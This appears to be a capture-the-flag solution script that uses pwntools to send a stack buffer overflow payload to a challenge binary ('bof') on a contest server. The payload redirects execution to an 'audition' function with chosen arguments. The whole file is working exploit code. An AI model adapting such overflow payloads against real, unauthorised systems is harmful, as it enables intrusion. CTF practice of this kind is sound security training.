from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='i386')
p = remote('ctf.umbccd.io', 4000)
# p = process('./bof')
# p = gdb.debug('./bof')

audition = p32(0x08049182)
time = p32(1200)
room_num = p32(366)
junk = b'JUNK'

buf = b''
buf += b'a'*62
buf += audition
buf += junk
buf += time
buf += room_num

p.sendline(buf)
p.sendline(junk)

p.recvuntil('singing?\n')
print(p.recvall().decode())
